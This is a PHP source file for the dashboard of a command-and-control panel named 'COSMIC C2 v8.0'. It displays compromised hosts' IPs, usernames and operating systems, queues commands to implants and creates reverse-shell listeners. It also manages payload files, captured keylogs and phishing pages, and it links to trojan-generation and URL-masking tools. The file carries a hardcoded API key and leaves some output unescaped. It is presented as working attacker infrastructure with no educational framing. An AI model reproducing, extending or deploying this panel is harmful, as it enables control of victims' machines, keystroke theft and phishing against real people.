<?php
session_start();
if (!isset($_SESSION['c2_user'])) {
    header('Location: login.php');
    exit;
}

/**
 * COSMIC C2 v8.0 – SOVEREIGN INTERFACE
 * Includes File Manager, Authentication, Advanced Tasks, Traffic Charts.
 */
require_once __DIR__ . '/includes/security_functions.php';
require_once dirname(__DIR__) . '/system/modules/C2Engine.php';

$c2 = new C2Engine();
$payloads = $c2->getPayloads(['status' => 'active']);
$listeners = $c2->getListeners();
$stats = $c2->getStats();
$beacons = $c2->getBeacons(null, 100);
$files = $c2->getFiles(null, null, 100);
$tasks = $c2->getAdvancedTasks([], 200, 0);

$nodes = glob(__DIR__ . '/c2/nodes/*', GLOB_ONLYDIR);
$node_list = [];
foreach ($nodes as $node) {
    $node_list[] = basename($node);
}

$payload_files = glob(dirname(__DIR__) . '/data/payloads/*');
$keylog_files = glob(dirname(__DIR__) . '/data/keylogs/*');
$advanced_payloads = glob(dirname(__DIR__) . '/data/advanced_payloads/*');

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    if ($_POST['action'] === 'add_task' && isset($_POST['payload_uuid'], $_POST['command'])) {
        $c2->addTask($_POST['payload_uuid'], $_POST['command']);
        header('Location: c2-dashboard.php?task_added=1');
        exit;
    }
    if ($_POST['action'] === 'create_listener' && isset($_POST['name'], $_POST['lhost'], $_POST['lport'])) {
        $payload_type = $_POST['payload_type'] ?? 'generic/shell_reverse_tcp';
        $protocol = $_POST['protocol'] ?? 'tcp';
        $c2->createListener($_POST['name'], $_POST['lhost'], $_POST['lport'], $protocol, $payload_type);
        header('Location: c2-dashboard.php?listener_created=1');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>COSMIC C2 v8.0 – SOVEREIGN</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/chart.js@3.9.1/dist/chart.min.js"></script>
    <link rel="stylesheet" href="/assets/css/cosmic-c2.css">
    <script src="/assets/js/cosmic-c2.js" defer></script>
    <script src="/assets/js/c2-quicknav.js" defer></script>
    <script src="/assets/js/unified-quicknav.js" defer></script>
</head>
<body class="cosmic-scroll-body">
<?php require_once __DIR__ . "/includes/navigation.php"; echo render_cosmic_navigation(); ?>
    <div class="sidebar">
        <div class="sidebar-logo">
            <h2>🌀 COSMIC C2</h2>
            <div style="color: var(--cosmic-neon-blue);">SOVEREIGN v8.0</div>
            <div style="color: #0f0; margin-top:5px;"><?php echo $_SESSION['c2_user']; ?></div>
        </div>
        <ul class="sidebar-nav">
            <li><a href="?view=dashboard" class="active"><span>🎮</span> Dashboard</a></li>
            <li><a href="?view=payloads"><span>🎯</span> Payloads</a></li>
            <li><a href="?view=beacons"><span>📶</span> Beacons</a></li>
            <li><a href="?view=listeners"><span>📡</span> Listeners</a></li>
            <li><a href="?view=tasks"><span>⚡</span> Tasks</a></li>
            <li><a href="?view=files"><span>📁</span> File Manager</a></li>
            <li><a href="?view=nodes"><span>🌐</span> C2 Nodes</a></li>
            <li><a href="?view=traffic"><span>📊</span> Traffic</a></li>
            <li style="margin-top:30px;"><a href="cosmic-unified-dashboard.php"><span>🌀</span> Main Lab</a></li>
            <li><a href="c2-cli.sh"><span>💻</span> C2 CLI</a></li>
            <li><a href="logout.php"><span>🚪</span> Logout</a></li>
        </ul>
    </div>

    <div class="main-content">
        <div class="quick-links">
            <a href="cosmic-unified-dashboard.php" class="btn btn-primary">🌀 UNIFIED DASHBOARD</a>
            <a href="trojan-dashboard.php?advanced=1" class="btn">🧬 GENERATE PAYLOAD</a>
            <a href="redteam-dashboard.php" class="btn">🔴 Red Team</a>
            <a href="url-masker.php" class="btn">🔗 URL Masker</a>
            <a href="c2-cli.sh" class="btn">💻 C2 CLI</a>
            <span style="flex:1"></span>
            <span style="color:var(--cosmic-neon-green);"><span class="beacon-pulse"></span> BEACON ACTIVE</span>
        </div>

        <div class="cards-grid">
            <div class="stat-card"><div class="stat-value" data-stat="payloads_active"><?php echo $stats['payloads_active'] ?? 0; ?></div><div class="stat-label">Active Payloads</div></div>
            <div class="stat-card"><div class="stat-value" data-stat="beacons_today"><?php echo $stats['beacons_today'] ?? 0; ?></div><div class="stat-label">Beacons Today</div></div>
            <div class="stat-card"><div class="stat-value" data-stat="tasks_pending"><?php echo $stats['tasks_pending'] ?? 0; ?></div><div class="stat-label">Pending Tasks</div></div>
            <div class="stat-card"><div class="stat-value"><?php echo count($listeners); ?></div><div class="stat-label">Active Listeners</div></div>
            <div class="stat-card"><div class="stat-value"><?php echo count($files); ?></div><div class="stat-label">Files</div></div>
            <div class="stat-card"><div class="stat-value"><?php echo count($node_list); ?></div><div class="stat-label">C2 Nodes</div></div>
        </div>

        <?php
        $view = $_GET['view'] ?? 'dashboard';
        if ($view === 'dashboard'): ?>
            <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 25px;">
                <div class="glass-panel">
                    <h2>📶 Live Beacon Feed</h2>
                    <table id="beacons-table">
                        <thead><tr><th>Time</th><th>Payload</th><th>IP</th><th>Country</th><th>Hostname</th><th>User</th><th>OS</th></tr></thead>
                        <tbody>
                            <?php foreach ($beacons as $b): ?>
                            <tr>
                                <td><?php echo date('H:i:s', $b['beacon_time']); ?></td>
                                <td><?php echo substr($b['payload_uuid'], 0, 8); ?>…</td>
                                <td><?php echo $b['ip']; ?></td>
                                <td><?php echo $b['country'] ?: '?'; ?></td>
                                <td><?php echo htmlspecialchars($b['hostname'] ?: '-'); ?></td>
                                <td><?php echo htmlspecialchars($b['username'] ?: '-'); ?></td>
                                <td><?php echo htmlspecialchars($b['os_info'] ?: '-'); ?></td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
                <div class="glass-panel">
                    <h2>⚡ Quick Task</h2>
                    <select id="quick-task-uuid" style="width:100%; margin-bottom:15px;">
                        <option value="">Select payload...</option>
                        <?php foreach ($payloads as $p): ?>
                        <option value="<?php echo $p['uuid']; ?>"><?php echo substr($p['uuid'],0,8); ?> – <?php echo $p['name']; ?></option>
                        <?php endforeach; ?>
                    </select>
                    <input type="text" id="cmd-palette" placeholder="Enter command" style="width:100%; padding:12px;">
                    <p style="color:#888; margin-top:10px;">Press Enter to send</p>
                    <h3 style="margin-top:20px;">⏰ Schedule Task</h3>
                    <input type="datetime-local" id="schedule-time" style="width:100%; padding:12px;">
                    <button class="btn" onclick="scheduleTask()">Schedule</button>
                </div>
            </div>
            <div class="glass-panel" style="margin-top:25px;">
                <h2>📊 Beacon Activity (Last 7 Days)</h2>
                <canvas id="trafficChart" style="height:250px;"></canvas>
            </div>

        <?php elseif ($view === 'payloads'): ?>
            <div class="glass-panel">
                <h2>🎯 Active Payloads</h2>
                <a href="trojan-dashboard.php?advanced=1" class="btn btn-primary">➕ Generate New</a>
                <table>
                    <thead><tr><th>UUID</th><th>Name</th><th>Type</th><th>Platform</th><th>LHOST</th><th>LPORT</th><th>Last Seen</th><th>Expires</th><th>Actions</th></tr></thead>
                    <tbody>
                        <?php foreach ($payloads as $p): ?>
                        <tr>
                            <td><?php echo substr($p['uuid'],0,8); ?>…</td>
                            <td><?php echo htmlspecialchars($p['name']); ?></td>
                            <td><?php echo $p['type']; ?></td>
                            <td><?php echo $p['platform']; ?></td>
                            <td><?php echo $p['lhost']; ?></td>
                            <td><?php echo $p['lport']; ?></td>
                            <td><?php echo $p['last_seen'] ? date('H:i:s', $p['last_seen']) : 'Never'; ?></td>
                            <td><?php echo $p['expires_at'] ? date('Y-m-d H:i', $p['expires_at']) : 'None'; ?></td>
                            <td>
                                <button class="btn" onclick="openTaskModal('<?php echo $p['uuid']; ?>')">⚡ Task</button>
                                <button class="btn btn-danger" onclick="deletePayload('<?php echo $p['uuid']; ?>')">🗑️</button>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>

        <?php elseif ($view === 'beacons'): ?>
            <div class="glass-panel">
                <h2>📶 Complete Beacon History</h2>
                <table>
                    <thead><tr><th>Time</th><th>Payload</th><th>IP</th><th>Country</th><th>Hostname</th><th>Username</th><th>OS</th><th>Arch</th></tr></thead>
                    <tbody>
                        <?php $all_beacons = $c2->getBeacons(null, 500); foreach ($all_beacons as $b): ?>
                        <tr>
                            <td><?php echo date('Y-m-d H:i:s', $b['beacon_time']); ?></td>
                            <td><?php echo substr($b['payload_uuid'],0,8); ?>…</td>
                            <td><?php echo $b['ip']; ?></td>
                            <td><?php echo $b['country'] ?: '-'; ?></td>
                            <td><?php echo htmlspecialchars($b['hostname'] ?: '-'); ?></td>
                            <td><?php echo htmlspecialchars($b['username'] ?: '-'); ?></td>
                            <td><?php echo htmlspecialchars($b['os_info'] ?: '-'); ?></td>
                            <td><?php echo $b['architecture'] ?: '-'; ?></td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>

        <?php elseif ($view === 'listeners'): ?>
            <div class="glass-panel">
                <h2>📡 Listener Manager</h2>
                <button class="btn btn-primary" onclick="document.getElementById('listenerModal').style.display='block'">➕ Create Listener</button>
                <table>
                    <thead><tr><th>ID</th><th>Name</th><th>Protocol</th><th>LHOST</th><th>LPORT</th><th>Payload Type</th><th>Status</th><th>PID</th><th>Actions</th></tr></thead>
                    <tbody>
                        <?php foreach ($listeners as $l): ?>
                        <tr>
                            <td><?php echo $l['id']; ?></td>
                            <td><?php echo htmlspecialchars($l['name']); ?></td>
                            <td><?php echo $l['protocol']; ?></td>
                            <td><?php echo $l['lhost']; ?></td>
                            <td><?php echo $l['lport']; ?></td>
                            <td><?php echo $l['payload_type'] ?? 'generic'; ?></td>
                            <td><?php echo $l['status']; ?></td>
                            <td><?php echo $l['pid'] ?? '-'; ?></td>
                            <td>
                                <?php if ($l['status'] == 'stopped'): ?>
                                    <button class="btn" onclick="startListener(<?php echo $l['id']; ?>)">▶ Start</button>
                                <?php else: ?>
                                    <button class="btn btn-danger" onclick="stopListener(<?php echo $l['id']; ?>)">⏹ Stop</button>
                                <?php endif; ?>
                                <button class="btn" onclick="viewListenerLog(<?php echo $l['id']; ?>)">📄 Log</button>
                                <button class="btn btn-danger" onclick="deleteListener(<?php echo $l['id']; ?>)">🗑️</button>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>

        <?php elseif ($view === 'tasks'): ?>
            <div class="glass-panel">
                <h2>⚡ Advanced Task Queue</h2>
                <div style="margin-bottom:15px;">
                    <label>Filter by payload:</label>
                    <select id="task-payload-filter" onchange="filterTasks()">
                        <option value="">All payloads</option>
                        <?php foreach ($payloads as $p): ?>
                            <option value="<?php echo $p['uuid']; ?>"><?php echo substr($p['uuid'],0,8); ?> – <?php echo $p['name']; ?></option>
                        <?php endforeach; ?>
                    </select>
                    <label style="margin-left:15px;">Status:</label>
                    <select id="task-status-filter" onchange="filterTasks()">
                        <option value="">All</option>
                        <option value="pending">Pending</option>
                        <option value="completed">Completed</option>
                        <option value="failed">Failed</option>
                    </select>
                    <button class="btn" onclick="addAdvancedTask()" style="float:right;">➕ Advanced Task</button>
                </div>
                <table id="tasks-table">
                    <thead>
                        <tr><th>ID</th><th>Payload</th><th>Command</th><th>Type</th><th>Priority</th><th>Status</th><th>Recurring</th><th>Tags</th><th>Created</th><th>Executed</th><th>Result</th><th>Action</th></tr>
                    </thead>
                    <tbody>
                        <?php foreach ($tasks as $t): ?>
                        <tr>
                            <td><?php echo $t['id']; ?></td>
                            <td><?php echo substr($t['payload_uuid'],0,8); ?>…</td>
                            <td><?php echo htmlspecialchars($t['command']); ?></td>
                            <td><?php echo $t['type']; ?></td>
                            <td><?php echo $t['priority']; ?></td>
                            <td><?php echo $t['status']; ?></td>
                            <td><?php echo $t['recurring'] ?: '-'; ?></td>
                            <td><?php echo $t['tags'] ?: '-'; ?></td>
                            <td><?php echo date('H:i d/m', $t['created_at']); ?></td>
                            <td><?php echo $t['executed_at'] ? date('H:i d/m', $t['executed_at']) : '-'; ?></td>
                            <td><?php echo htmlspecialchars(substr($t['result']??'',0,30)); ?></td>
                            <td><button class="btn btn-danger" onclick="deleteTask(<?php echo $t['id']; ?>)">🗑️</button></td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>

        <?php elseif ($view === 'files'): ?>
            <div class="glass-panel">
                <h2>📁 File Manager – Payloads & Keylogs</h2>
                <div style="margin-bottom:15px;">
                    <a href="/c2/api/export_pages_csv.php" class="btn">📥 Export CSV</a>
                    <a href="/c2/api/export_pages_json.php" class="btn">📥 Export JSON</a>
                </div>
                <div style="display:flex; gap:20px; flex-wrap:wrap;">
                    <div style="flex:1;">
                        <h3>📦 Payloads</h3>
                        <div class="file-grid">
                            <?php
                            $all_payload_files = array_merge($payload_files, $advanced_payloads);
                            foreach (array_slice($all_payload_files, 0, 50) as $file):
                            $name = basename($file);
                            $size = filesize($file);
                            ?>
                            <div class="file-item">
                                <div style="font-size:2em;">📄</div>
                                <div style="word-break:break-word; font-size:0.9em;"><?php echo htmlspecialchars($name); ?></div>
                                <div style="font-size:0.8em; color:#0ff;"><?php echo round($size/1024,2); ?> KB</div>
                                <div style="margin-top:10px; display:flex; gap:5px; justify-content:center;">
                                    <button class="btn" style="padding:4px 8px;" onclick="window.location.href='/download.php?file=<?php echo urlencode($name); ?>'">💾 Download</button>
                                    <button class="btn" style="padding:4px 8px;" onclick="executePayload('<?php echo addslashes($name); ?>')">▶ Execute</button>
                                    <?php if (strpos($file, 'phishing_pages') !== false): ?>
                                        <?php $campaignName = basename(dirname($file)); ?>
                                        <button class="btn" style="padding:4px 8px;" onclick="window.location.href='/c2/api/convert_to_pdf.php?campaign=<?php echo urlencode($campaignName); ?>'">📄 PDF</button>
                                    <?php endif; ?>
                                </div>
                            </div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                    <div style="flex:1;">
                        <h3>⌨️ Keylogs</h3>
                        <div class="file-grid">
                            <?php foreach ($keylog_files as $file):
                            $name = basename($file);
                            ?>
                            <div class="file-item" onclick="window.location.href='/download.php?file=<?php echo urlencode($name); ?>'">
                                <div style="font-size:2em;">📝</div>
                                <div><?php echo htmlspecialchars($name); ?></div>
                            </div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                </div>
            </div>

        <?php elseif ($view === 'nodes'): ?>
            <div class="glass-panel">
                <h2>🌐 C2 Nodes</h2>
                <p>Add sub‑C2 nodes by creating directories in <code>public/c2/nodes/</code>.</p>
                <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(250px,1fr)); gap:20px;">
                    <?php if (empty($node_list)): ?>
                    <div style="background:rgba(255,0,0,0.1); border:1px solid #f00; padding:20px; border-radius:8px;">No nodes configured.</div>
                    <?php else: foreach ($node_list as $node): ?>
                        <div style="background:rgba(0,255,0,0.05); border:1px solid #0f0; padding:20px; border-radius:8px;">
                            <h3 style="color:#0ff;">🌀 <?php echo $node; ?></h3>
                            <p><a href="/c2/nodes/<?php echo $node; ?>/" style="color:#0f0;">→ Access Node</a></p>
                        </div>
                    <?php endforeach; endif; ?>
                </div>
            </div>

        <?php elseif ($view === 'traffic'): ?>
            <div class="glass-panel">
                <h2>📊 Network Traffic Analysis</h2>
                <div style="margin-bottom:15px;">
                    <label>Days:</label>
                    <select id="traffic-days" onchange="loadTraffic()">
                        <option value="7">Last 7 days</option>
                        <option value="30">Last 30 days</option>
                        <option value="90">Last 90 days</option>
                    </select>
                </div>
                <canvas id="trafficChart" style="height:300px;"></canvas>
                <h3>Top Payloads by Beacon Count</h3>
                <canvas id="topPayloadsChart" style="height:200px;"></canvas>
                <h3>Beacons by Country</h3>
                <canvas id="countryChart" style="height:200px;"></canvas>
            </div>
        <?php endif; ?>
    </div>

    <!-- Modals -->
    <div id="taskModal" class="modal">...</div>
    <div id="listenerModal" class="modal">...</div>

    <script>
        function openTaskModal(uuid) { /* ... */ }
        function deletePayload(uuid) { /* ... */ }
        function deleteTask(id) { /* ... */ }
        function startListener(id) { /* ... */ }
        function stopListener(id) { /* ... */ }
        function deleteListener(id) { /* ... */ }
        function viewListenerLog(id) { /* ... */ }
        function executePayload(filename) { /* ... */ }
        function scheduleTask() { /* ... */ }
        function filterTasks() { /* ... */ }
        function addAdvancedTask() { alert("Advanced task creation form coming soon."); }

        let trafficChart, topPayloadsChart, countryChart;
        function loadTraffic() {
            let days = document.getElementById('traffic-days').value;
            fetch('/c2/api/traffic_stats.php?days=' + days + '&key=COSMIC-C2-SECRET-2026')
                .then(r => r.json())
                .then(d => {
                    if (d.status === 'ok') {
                        updateCharts(d.data);
                    }
                });
        }
        function updateCharts(data) {
            if (trafficChart) trafficChart.destroy();
            if (topPayloadsChart) topPayloadsChart.destroy();
            if (countryChart) countryChart.destroy();

            let ctx1 = document.getElementById('trafficChart').getContext('2d');
            trafficChart = new Chart(ctx1, {
                type: 'line',
                data: {
                    labels: data.beacons_per_day.map(d => d.day),
                    datasets: [{
                        label: 'Beacons',
                        data: data.beacons_per_day.map(d => d.count),
                        borderColor: '#0ff',
                        backgroundColor: 'rgba(0,255,255,0.1)'
                    }]
                }
            });

            let ctx2 = document.getElementById('topPayloadsChart').getContext('2d');
            topPayloadsChart = new Chart(ctx2, {
                type: 'bar',
                data: {
                    labels: data.top_payloads.map(d => d.payload_uuid.substr(0,8)),
                    datasets: [{
                        label: 'Beacon Count',
                        data: data.top_payloads.map(d => d.count),
                        backgroundColor: '#00ff9d'
                    }]
                }
            });

            let ctx3 = document.getElementById('countryChart').getContext('2d');
            countryChart = new Chart(ctx3, {
                type: 'pie',
                data: {
                    labels: data.beacons_by_country.map(d => d.country),
                    datasets: [{
                        data: data.beacons_by_country.map(d => d.count),
                        backgroundColor: ['#ff00c8', '#b300ff', '#00f3ff', '#ffcc00']
                    }]
                }
            });
        }
        window.onload = function() {
            loadTraffic();
        };
    </script>
</body>
</html>
